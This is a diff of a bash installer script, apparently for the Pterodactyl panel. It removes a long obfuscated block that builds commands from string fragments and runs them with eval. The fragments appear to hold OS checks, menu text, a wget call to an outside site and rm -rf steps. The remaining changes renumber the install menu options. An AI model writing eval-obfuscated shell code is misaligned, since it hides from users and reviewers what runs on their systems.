';MDz='18.0';pz='http';mFz='64-b';nOz='[11]';nPz='n=9';lMz='te, ';UBz='. In';ACz='lsb_';UEz='.2" ';ODz='6.04';eFz='-m`';pBz=' ini';jOz='pass';mJz=' gen';aCz='dete';SHz='"" ]';rNz='.7.1';ZKz='ith ';EOz='pdat';yKz=' pro';qGz='ebia';hz='y is';RGz='upda';iHz='Open';BIz=' met';HGz='c Vi';oHz='"$vi';ZCz='ion ';AJz=' in';LLz='s."';kKz='his ';OLz='dLin';XDz='bian';AIz='d Vi';yDz='ra v';KOz='nly ';qLz='m De';KHz='_ser';TOz='nel.';gBz='lems';hHz='c" ]';vBz='/os-';wHz='lxc"';fDz=' Deb';QFz='en';VIz='d at';WPz=' upg';pEz='st" ';cGz='erti';LQz='ost ';sDz='"$di';eLz='xit ';vz='cord';rFz='ed! ';gIz='reak';aFz='INE_';vGz='hat ';hMz='dex.';oNz='x pa';QDz=' sup';ILz='rthe';vNz='x da';GGz=' 4';VFz='c Ar';MKz='last';Kz='de s';oEz='b_di';dz='Plea';PFz='; th';WIz='r ow';KEz=' Cen';wLz='l. M';hLz=' fur';dKz='atio';jFz=' == ';cFz='=`un';APz=' sel';uBz='/etc';PCz='else';xJz='grep';tIz='read';CGz='itch';eHz='= "o';aJz='OVH ';LIz='er y';aKz='a ri';AMz='rwar';tPz='10 )';gCz='"ubu';xGz='  "f';YGz='ll s';CJz='Proc';vOz='ptio';wz='Than';tLz='ct a';jHz='VZ 7';yLz='g fo';vHz='nvz ';VLz='s no';WNz='l."';OIz='an r';LCz='_ver';pHz='rt_s';YDz='" ];';EPz='2 ) ';QMz='/nul';jMz='Up t';VDz='t" =';iBz='mati';cJz=' scr';qDz=' ] &';sEz='atin';lOz=' res';TIz='. Pr';kOz='word';PPz='ndal';PDz=' are';ECz='tc/o';GOz='MyAd';IEz='Cent';rDz='& [ ';nJz='eric';AKz='pve;';eNz='[4] ';oDz='dora';QJz='el D';INz='us o';pDz='"29"';dLz='ll e';VMz='-q "';FPz='n=2';tDz='st_v';fMz='7pjW';qPz='tyl'\''';DFz='.04"';LFz=' "$E';bBz='sh O';EMz=' upd';sHz='are"';DEz='nd 2';oIz='d?\n';jDz='are ';gFz='ACHI';wJz=') | ';bGz='prop';NPz='d to';TKz='ng a';uGz='rt-w';nIz=' "Pr';oOz='cy D';DNz='ve t';BBz='ur p';MIz='our ';lBz='ing ';wEz='d OS';cMz='J3ui';TCz='OS: ';oJz='trib';BPz='d pa';dMz='jMXQ';EHz='"rhe';pPz='nge ';BOz='0.4.';LHz='v=$(';qFz='tect';fz='epor';JIz='er w';bNz='l an';hNz='ne S';hOz='DB r';JJz='ng i';Jz='pgra';bIz='ld b';Nz='9.0.';HKz='osen';tBz=' -r ';ULz='er i';qIz='Yes.';UIz='ocee';jKz='d. T';SBz='fres';RHz='serv';aEz=' ver';GDz='tu v';eJz='will';eOz='rgen';LMz='h.se';oKz='ly n';kPz='Admi';RCz=' 1';jBz='c Op';yHz=' "Un';YEz='.6" ';MJz='.."';YMz='nsdz';hFz='NE_T';mKz='defi';fCz=' =  ';bFz='TYPE';uDz='on" ';BHz=' || ';pIz='[1] ';HEz='"7" ';CCz='="$(';PLz='ux K';NCz='VERS';FKz=' hav';EJz='ng..';IBz='t th';HPz='ly."';OCz='ION_';CHz='" = ';UGz='-mis';CBz='urch';XNz='[2] ';uMz='ated';fFz=' ${M';UPz='5 ) ';PEz=']&&[';hIz='s at';LPz='4 ) ';PNz='at y';FEz=' "ce';THz='Virt';xFz=' det';cDz='= "8';cOz='[10]';ICz=' ech';TJz='cho ';rPz='s th';AHz='a" ]';lNz='Upgr';kNz='[5] ';RFz='un a';mDz='d.."';QIz='ocke';LOz='this';dNz='emon';wKz='of w';bEz='. On';KFz=': 7"';YIz='sk."';Bz='ut "';QNz='ou w';tKz=' reg';WOz='Chan';iDz='d 8 ';xHz='warn';AFz='18.1';GHz='yum ';FGz='64).';lz='t vi';Ez='tyl ';JKz='inue';pKz='ot w';fKz='stab';rJz='rnel';lEz='"cen';GFz='ra: ';OFz=' 0 ]';AEz=' Fed';FDz='Ubun';IMz='ps:/';kHz='d."';BGz='e sw';TBz='h OS';bDz='"9" ';ANz='If y';xBz=']; t';nEz='"$ls';FFz='9, 8';MBz='nt t';MCz='sion';HMz=' htt';SNz=' lik';eIz='if y';wIz='case';FJz=';;';mNz='ade ';WFz='chit';pCz='] &&';yMz='st v';jPz='hpMy';vPz='on=1';lKz='ill ';yPz='riaD';PHz=' "$v';BDz='04" ';uz='/dis';AOz='o 1.';HHz=' wge';lLz='gcp;';SKz='proc';JEz='OS v';xIz=' $ch';kDz='supp';ZOz='dact';GLz='avoi';yFz='ecte';LEz='tOS ';SPz=' ser';IOz='4.8.';rIz='\n[2';PBz='tall';vFz='itec';BQz='ot p';qBz='tial';Az='outp';uPz='opti';KQz='se H';MHz='echo';IJz='elli';sFz='Good';DCz='. /e';VCz='_dis';RJz=' Ini';LGz='ecti';KKz=' in ';JLz='r da';Uz='en T';aPz='6 ) ';CFz=', 16';MMz='cure';fHz='penv';FBz='ase ';YPz=' pan';QPz='one ';pJz='utio';XOz='ge P';vEz='Supp';pOz='atab';UHz='uali';SEz='&[ "';hBz='Auto';GNz='ror,';FCz='s-re';SGz='te -';ez='se r';qCz=' [ "';iOz='oot ';OBz=' ins';OEz='el" ';QHz='irt_';nLz='le C';Yz='an@s';DMz=' for';MQz='info';cPz=' dae';uHz='"ope';SJz='if e';VNz='pane';ZLz='Linu';iKz='VZ 6';HDz='ersi';eEz='t" !';HOz='min ';yCz='&& [';FOz=' php';uIz=' cho';SDz='ed."';wNz='12."';qKz='ork ';dGz='es-c';BMz='Chec';rz='secu';wOz='n=1';cLz='t wi';vKz='ess ';NIz='er c';lDz='orte';QGz='get ';bMz='gE2r';HQz='1';eMz='36iy';ONz='t wh';MFz='UID"';CNz='elie';uJz='unam';tCz='rsio';XJz='ep -';cEz='ly R';NQz='rmat';dIz='ven ';bHz='$vir';oPz=' cha';AQz='B ro';KGz=' Det';gEz='bunt';EDz='ted ';ePz='7 ) ';oGz='what';wBz='rele';dOz=' Eme';ZJz='xx; ';wGz='wget';jCz='then';gPz='8 ) ';kEz='" !=';vMz='ipt,';oCz='10" ';RBz='n a ';jJz='ur s';QKz='fore';SMz='&1';lPz='n."';XMz='kKnD';xMz='late';HBz=' tha';hDz='9 an';bz='.io>';tJz='o $(';DDz='ppor';EIz='ult ';YBz='on a';WKz='wn r';xKz='your';CKz='mox ';HCz='e &&';lHz='rv d';kMz='o da';ZFz='MACH';HLz='d fu';CMz='king';lJz='th a';WEz='.4" ';UKz='t yo';Hz='tion';oMz='rm -';OGz='aliz';mEz='tos"';eKz='n...';wFz='ture';sLz='not ';hPz='n=8';gMz='" in';cCz=' "$l';aOz='yl t';DJz='eedi';bPz='n=6';gGz='repo';dEz='HEL ';KPz='and ';jLz=' dam';dHz='rv" ';MNz='se s';fPz='n=7';SOz='e pa';ROz='d th';KCz='ID")';vJz='e -r';VOz='[9] ';YKz='ng w';VJz='-r) ';lCz='ion"';NOz='ou h';BNz='ou b';tOz='1 ) ';IKz='cont';lIz='n th';kLz='ages';CDz='Unsu';uCz='n" !';PKz='here';sKz='ker,';Rz='t © ';HNz='act ';DPz='y."';nMz='go!"';aMz='CmWV';FNz='n er';jz=' or ';DIz='cons';yOz='have';yBz='hen';pGz='  "d';RKz=' we ';wCz='8.04';HJz='Canc';XFz='ectu';mLz='Goog';tEz='g Sy';XCz='ist_';GEz='ntos';EKz=' You';Gz='alla';SIz=' not';XEz='"7.5';RPz='SFTP';jGz='y un';KMz='taut';TFz='ot"';EQz='rese';UMz='rep ';TMz='if g';wPz='0';vLz='ad k';OOz='ave ';QOz='alle';fGz='add-';NFz=' -ne';Tz=' Thi';yJz=' -q ';iIz=' any';UJz='$(un';KJz='llat';aIz=' wou';uNz='0.6.';vIz='ice';rHz='"vmw';XLz='on C';tGz='n vi';DKz='LXE ';QBz='ed o';ENz='is a';ZDz=' the';yNz='er t';xCz='" ] ';rEz='Oper';dDz='Debi';JMz='/sof';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$z$Az$Bz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$z$Az$Bz$dz$ez$fz$gz$hz$iz$jz$kz$Qz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$Oz$z$Az$Bz$Oz$z$Az$Bz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$Lz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$cz$z$Az$Bz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$Hz$pBz$qBz$rBz$cz$z$sBz$tBz$uBz$vBz$wBz$FBz$xBz$yBz$z$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$Oz$z$BCz$LCz$MCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$NCz$OCz$KCz$Oz$z$PCz$z$QCz$RCz$z$SCz$z$Az$Bz$TCz$UCz$VCz$WCz$XCz$YCz$ZCz$aCz$bCz$cz$z$Az$Bz$Oz$z$sBz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$z$sBz$kCz$XCz$YCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$kCz$XCz$YCz$lCz$mCz$ADz$BDz$xBz$yBz$z$Az$Bz$CDz$DDz$EDz$FDz$GDz$HDz$IDz$JDz$KDz$LDz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$z$QCz$TDz$z$SCz$z$UDz$qCz$UCz$VCz$VDz$WDz$XDz$YDz$ZDz$aDz$z$sBz$kCz$XCz$YCz$lCz$mCz$bDz$pCz$qCz$rCz$sCz$tCz$uCz$cDz$YDz$ZDz$aDz$z$Az$Bz$CDz$DDz$EDz$dDz$eDz$HDz$IDz$JDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$mDz$z$QCz$TDz$z$SCz$z$UDz$qCz$UCz$VCz$VDz$nDz$oDz$YDz$ZDz$aDz$z$sBz$kCz$XCz$YCz$lCz$mCz$pDz$qDz$rDz$sDz$tDz$HDz$uDz$vDz$wDz$xBz$yBz$z$Az$Bz$CDz$DDz$EDz$xDz$yDz$HDz$IDz$JDz$AEz$BEz$CEz$DEz$EEz$QDz$RDz$SDz$z$QCz$TDz$z$SCz$z$UDz$qCz$UCz$VCz$VDz$FEz$GEz$YDz$ZDz$aDz$z$sBz$kCz$XCz$YCz$lCz$mCz$HEz$xBz$yBz$z$Az$Bz$CDz$DDz$EDz$IEz$JEz$HDz$IDz$JDz$KEz$LEz$MEz$QDz$RDz$SDz$z$QCz$TDz$z$SCz$z$UDz$qCz$UCz$VCz$VDz$NEz$OEz$xBz$yBz$z$sBz$kCz$XCz$YCz$lCz$mCz$HEz$PEz$kCz$XCz$YCz$lCz$mCz$QEz$REz$SEz$rCz$sCz$tCz$uCz$TEz$UEz$PEz$kCz$XCz$YCz$lCz$mCz$VEz$REz$SEz$rCz$sCz$tCz$uCz$TEz$WEz$PEz$kCz$XCz$YCz$lCz$mCz$XEz$REz$SEz$rCz$sCz$tCz$uCz$TEz$YEz$xBz$yBz$z$Az$Bz$CDz$DDz$EDz$ZEz$aEz$MCz$bEz$cEz$dEz$MEz$QDz$RDz$SDz$z$QCz$TDz$z$SCz$z$UDz$qCz$UCz$VCz$eEz$fEz$gEz$hEz$iEz$jEz$ACz$BCz$kEz$WDz$XDz$xCz$yCz$cCz$dCz$eCz$mCz$lEz$mEz$qDz$rDz$nEz$oEz$pEz$vDz$qEz$YDz$ZDz$aDz$z$Az$Bz$CDz$DDz$EDz$rEz$sEz$tEz$uEz$cz$z$Az$Bz$Oz$z$Az$Bz$vEz$lDz$wEz$xEz$z$Az$Bz$FDz$yEz$AFz$BFz$wCz$CFz$DFz$z$Az$Bz$dDz$EFz$FFz$Oz$z$Az$Bz$xDz$GFz$HFz$IFz$z$Az$Bz$IEz$TCz$JFz$z$Az$Bz$ZEz$KFz$z$QCz$TDz$z$SCz$z$sBz$LFz$MFz$NFz$OFz$PFz$QFz$z$Az$Bz$dz$ez$RFz$SFz$TFz$z$QCz$UFz$z$SCz$z$Az$Bz$hBz$iBz$VFz$WFz$XFz$YFz$oBz$Hz$pBz$qBz$rBz$cz$z$ZFz$aFz$bFz$cFz$dFz$eFz$z$sBz$fFz$gFz$hFz$iFz$jFz$kFz$lFz$iCz$jCz$z$Az$Bz$mFz$nFz$oFz$pFz$qFz$rFz$sFz$oz$tFz$z$Az$Bz$Oz$z$PCz$z$Az$Bz$CDz$DDz$EDz$uFz$vFz$wFz$xFz$yFz$AGz$GCz$BGz$CGz$oz$mFz$DGz$EGz$FGz$Oz$z$QCz$GGz$z$SCz$z$Az$Bz$hBz$iBz$HGz$IGz$JGz$Hz$KGz$LGz$MGz$NGz$OGz$SDz$z$sBz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$z$PGz$QGz$RGz$SGz$TGz$UGz$VGz$z$PGz$QGz$WGz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$aDz$z$fGz$PGz$gGz$hGz$iGz$jGz$kGz$lGz$z$PGz$QGz$WGz$XGz$mGz$nGz$oGz$z$UDz$qCz$UCz$VCz$VDz$pGz$qGz$rGz$PFz$QFz$z$sGz$RGz$SGz$TGz$UGz$VGz$z$PGz$QGz$WGz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$tGz$uGz$vGz$wGz$z$UDz$qCz$UCz$VCz$VDz$xGz$yGz$AHz$BHz$jEz$ACz$BCz$CHz$FEz$GEz$xCz$DHz$cCz$dCz$eCz$fCz$EHz$FHz$PFz$QFz$z$GHz$WGz$XGz$mGz$nGz$oGz$HHz$IHz$z$SCz$z$JHz$KHz$LHz$MHz$NHz$nGz$oGz$OHz$z$sBz$PHz$QHz$RHz$CHz$SHz$PFz$QFz$z$Az$Bz$THz$UHz$VHz$WHz$XHz$YHz$ZHz$oBz$aHz$Oz$z$UDz$qCz$bHz$cHz$dHz$eHz$fHz$gHz$hHz$PFz$QFz$z$Az$Bz$THz$UHz$VHz$WHz$iHz$jHz$xFz$yFz$kHz$z$PCz$z$Az$Bz$THz$UHz$VHz$WHz$bHz$cHz$lHz$oBz$aHz$Oz$z$SCz$z$Az$Bz$Oz$z$sBz$PHz$QHz$RHz$kEz$mHz$pCz$qCz$bHz$cHz$dHz$vDz$nHz$qDz$rDz$oHz$pHz$qHz$mCz$rHz$sHz$qDz$rDz$oHz$pHz$qHz$mCz$tHz$qHz$qDz$rDz$oHz$pHz$qHz$mCz$uHz$vHz$wHz$iCz$jCz$z$xHz$yHz$kDz$lDz$AIz$IGz$JGz$Hz$BIz$CIz$EBz$FBz$DIz$EIz$FIz$GIz$HIz$IIz$JIz$KIz$LIz$MIz$RHz$NIz$OIz$PIz$QIz$RIz$SIz$TIz$UIz$VIz$GIz$WIz$XIz$YIz$z$xHz$ZIz$QDz$RDz$aIz$bIz$cIz$dIz$eIz$MIz$RHz$fIz$gIz$hIz$iIz$jIz$kIz$lIz$mIz$wFz$cz$z$xHz$nIz$UIz$oIz$pIz$qIz$rIz$sIz$cz$z$tIz$uIz$vIz$z$wIz$xIz$yIz$AJz$z$BJz$Az$Bz$CJz$DJz$EJz$cz$z$FJz$z$GJz$Az$Bz$HJz$IJz$JJz$XGz$KJz$LJz$MJz$z$QCz$NJz$z$FJz$z$OJz$z$Az$Bz$Oz$z$SCz$z$Az$Bz$PJz$QJz$oBz$Hz$RJz$qBz$rBz$cz$z$SJz$TJz$UJz$dFz$VJz$WJz$XJz$YJz$ZJz$jCz$z$Az$Bz$aJz$PJz$QJz$oBz$aHz$bJz$cJz$dJz$eJz$SIz$fJz$gJz$GCz$hJz$VBz$iJz$jJz$oFz$kJz$lJz$mJz$nJz$uz$oJz$pJz$qJz$rJz$cz$z$QCz$sJz$z$UDz$ICz$tJz$uJz$vJz$wJz$xJz$yJz$AKz$ZDz$aDz$z$Az$Bz$BKz$CKz$DKz$PJz$QJz$oBz$aHz$EKz$FKz$GKz$HKz$oz$IKz$JKz$KKz$LKz$MKz$NKz$OKz$PKz$QKz$RKz$jDz$SKz$DJz$TKz$UKz$VKz$WKz$XKz$Oz$z$Az$Bz$CJz$DJz$YKz$ZKz$aKz$bKz$cKz$dKz$eKz$Oz$z$UDz$ICz$tJz$uJz$vJz$wJz$xJz$yJz$fKz$PFz$QFz$z$SJz$TJz$UJz$dFz$VJz$WJz$XJz$gKz$hKz$yBz$z$Az$Bz$iHz$iKz$xFz$yFz$jKz$kKz$RHz$JIz$lKz$mKz$nKz$oKz$pKz$qKz$FIz$rKz$sKz$tKz$uKz$vKz$wKz$vGz$xKz$yKz$ALz$BLz$CLz$DLz$ELz$FLz$oz$GLz$HLz$ILz$JLz$KLz$LLz$z$QCz$sJz$z$SCz$z$UDz$ICz$tJz$uJz$vJz$wJz$xJz$yJz$MLz$ZDz$aDz$z$Az$Bz$NLz$OLz$PLz$QLz$RLz$qFz$SLz$TLz$ULz$VLz$WLz$DDz$EDz$XLz$YLz$ZLz$aLz$bLz$Lz$cLz$dLz$eLz$fLz$gLz$hLz$iLz$jLz$kLz$cz$z$QCz$sJz$z$UDz$ICz$tJz$uJz$vJz$wJz$xJz$yJz$lLz$ZDz$aDz$z$Az$Bz$mLz$nLz$YLz$oLz$pLz$qLz$qFz$SLz$sFz$oz$tFz$z$PCz$z$Az$Bz$rLz$sLz$aCz$tLz$uLz$vLz$QLz$wLz$xLz$yLz$AMz$kHz$z$Az$Bz$Oz$z$SCz$z$Az$Bz$BMz$CMz$DMz$EMz$FMz$GMz$z$wGz$HMz$IMz$JMz$KMz$LMz$MMz$NMz$OMz$PMz$QMz$RMz$SMz$z$TMz$UMz$VMz$WMz$XMz$YMz$ZMz$aMz$bMz$cMz$dMz$eMz$fMz$gMz$hMz$iMz$PFz$QFz$z$Az$Bz$jMz$kMz$lMz$mMz$oz$nMz$z$Az$Bz$Oz$z$oMz$pMz$qMz$rMz$sMz$z$PCz$z$Az$Bz$tMz$uMz$cJz$vMz$wMz$FBz$eBz$LKz$xMz$yMz$HDz$IDz$ANz$BNz$CNz$DNz$kKz$ENz$FNz$GNz$wMz$FBz$IKz$HNz$INz$JNz$KNz$kHz$z$oMz$pMz$qMz$rMz$sMz$z$QCz$LNz$z$SCz$z$Az$Bz$dz$MNz$NNz$ONz$PNz$QNz$RNz$SNz$TNz$OBz$PBz$xEz$z$Az$Bz$pIz$Fz$UNz$LKz$VNz$WNz$z$Az$Bz$XNz$Fz$UNz$LKz$YNz$ZNz$z$Az$Bz$aNz$Fz$UNz$LKz$VNz$bNz$cNz$dNz$cz$z$Az$Bz$eNz$Fz$UNz$LKz$fNz$gNz$hNz$iNz$RHz$jNz$z$Az$Bz$kNz$lNz$mNz$nNz$oNz$pNz$qNz$rNz$sNz$z$Az$Bz$tNz$lNz$mNz$uNz$vNz$dNz$oz$uNz$wNz$z$Az$Bz$xNz$lNz$mNz$LKz$fNz$gNz$hNz$iNz$RHz$yNz$AOz$BOz$Oz$z$Az$Bz$COz$Fz$UNz$DOz$EOz$TNz$FOz$GOz$HOz$IOz$JOz$KOz$eBz$LOz$MOz$LIz$NOz$OOz$POz$QOz$ROz$SOz$TOz$UOz$z$Az$Bz$VOz$WOz$XOz$YOz$ZOz$aOz$bOz$cz$z$Az$Bz$cOz$dOz$eOz$fOz$gOz$hOz$iOz$jOz$kOz$lOz$mOz$z$Az$Bz$nOz$dOz$eOz$oOz$pOz$FBz$qOz$rOz$sOz$Hz$lOz$mOz$z$tIz$uIz$vIz$z$wIz$xIz$yIz$AJz$z$tOz$POz$uOz$vOz$wOz$z$Az$Bz$xOz$yOz$APz$yFz$BPz$pNz$POz$Gz$Hz$CPz$DPz$z$FJz$z$EPz$POz$uOz$vOz$FPz$z$Az$Bz$xOz$yOz$APz$yFz$cNz$dNz$OBz$PBz$dKz$GPz$HPz$z$FJz$z$IPz$POz$uOz$vOz$JPz$z$Az$Bz$xOz$yOz$APz$yFz$BPz$pNz$KPz$YNz$MGz$XGz$KJz$LJz$Oz$z$FJz$z$LPz$POz$uOz$vOz$MPz$z$Az$Bz$xOz$yOz$APz$yFz$NPz$OBz$PBz$ZDz$OPz$PPz$QPz$RPz$SPz$TPz$Oz$z$FJz$z$UPz$POz$uOz$vOz$VPz$z$Az$Bz$xOz$yOz$APz$yFz$NPz$WPz$XPz$ZDz$YPz$ZPz$z$FJz$z$aPz$POz$uOz$vOz$bPz$z$Az$Bz$xOz$yOz$APz$yFz$NPz$WPz$XPz$ZDz$cPz$dPz$Oz$z$FJz$z$ePz$POz$uOz$vOz$fPz$z$Az$Bz$xOz$yOz$APz$yFz$NPz$WPz$XPz$ZDz$OPz$PPz$QPz$RPz$cz$z$FJz$z$gPz$POz$uOz$vOz$hPz$z$Az$Bz$xOz$yOz$APz$yFz$NPz$OBz$PBz$jz$RGz$iPz$jPz$kPz$lPz$z$FJz$z$mPz$POz$uOz$vOz$nPz$z$Az$Bz$xOz$yOz$APz$yFz$NPz$oPz$pPz$Cz$Dz$qPz$rPz$sPz$Oz$z$FJz$z$tPz$OBz$PBz$uPz$vPz$wPz$z$Az$Bz$xOz$yOz$APz$yFz$xPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$z$FJz$z$GQz$OBz$PBz$uPz$vPz$HQz$z$Az$Bz$xOz$yOz$APz$yFz$IQz$JQz$KQz$LQz$MQz$NQz$ZCz$EQz$FQz$z$FJz$z$OJz"
+preflight
 case $installoption in 
     1)  webserver_options
         theme_options
@@ -1316,16 +1684,14 @@ case $installoption in
         setup_pterodactyl
         broadcast
         ;;
-    2)  get_virtualization
-        repositories_setup
+    2)  repositories_setup
         required_infos
         firewall
         ssl_certs
         install_daemon
         broadcast
         ;;
-    3)  get_virtualization
-        webserver_options
+    3)  webserver_options
         theme_options
         repositories_setup
         required_infos
@@ -1342,18 +1708,24 @@ case $installoption in
         ;;
     6)  upgrade_daemon
         ;;
-    7)  upgrade_standalone_sftp
+    7)  theme_options
+        upgrade_pterodactyl
+        theme
+        upgrade_daemon
         ;;
-    8)  install_phpmyadmin
+    8)  upgrade_standalone_sftp
         ;;
-    9)  theme_options
+    9)  install_phpmyadmin
+        ;;
+    10)  theme_options
         if [ "$themeoption" = "1" ]; then
             upgrade_pterodactyl
         fi
         theme
         ;;
-    10) mariadb_root_reset
+    11) mariadb_root_reset
         ;;
-    11) database_host_reset
+    12) database_host_reset
         ;;
 esac
+rm -rf install.sh.x
